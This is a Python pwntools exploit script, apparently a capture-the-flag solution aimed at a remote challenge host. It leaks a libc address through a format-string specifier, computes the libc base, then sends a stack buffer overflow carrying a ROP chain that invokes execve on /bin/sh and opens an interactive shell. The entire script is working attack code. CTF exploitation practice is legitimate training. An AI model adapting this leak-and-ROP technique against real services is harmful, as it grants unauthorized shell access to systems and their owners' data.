from pwn import *
from re import findall

io = None

if args.LOCAL:
    io = process('./deploy/service/task.elf')
else:
    io = remote('ctf.li2sites.ru', 21008)


__LIBC_START_MAIN_RET_OFFSET = 0x270b3
POP_RDI = 0x26b72
POP_RSI = 0x27529
POP_RDX_RBX = 0x162866
POP_RAX = 0x4a550
BIN_SH_STR_ADDR = 0x1b75aa
SYSCALL = 0x2584d

print("[.] using ROP")

# ============================= leak executable base =============================
io.recvuntil(b'?\n')

io.sendline('%13$p') # pre-calculated stack index of __libc_start_main_ret

tmp = io.recvline().decode()
tmp = findall("(?<=0x)[a-f0-9A-F]{8,}", tmp)[0]
leak = int(tmp, 16)
libc_base = leak - __LIBC_START_MAIN_RET_OFFSET
print(f'[*] Libc base leaked: {hex(libc_base)}')
# ================================================================================

payload = b'A' * 32 + b'B' * 8 # overflow the buffer and saved RBP

# ================================== ROP chain ===================================
payload += p64(POP_RDI + libc_base)
payload += p64(BIN_SH_STR_ADDR + libc_base)
payload += p64(POP_RSI + libc_base)
payload += p64(0)
payload += p64(POP_RAX + libc_base)
payload += p64(0)
payload += p64(POP_RDX_RBX + libc_base)
payload += p64(0)
payload += p64(0)
payload += p64(POP_RAX + libc_base)
payload += p64(59)
payload += p64(SYSCALL + libc_base)
# ================================================================================

io.sendline(payload)
io.interactive()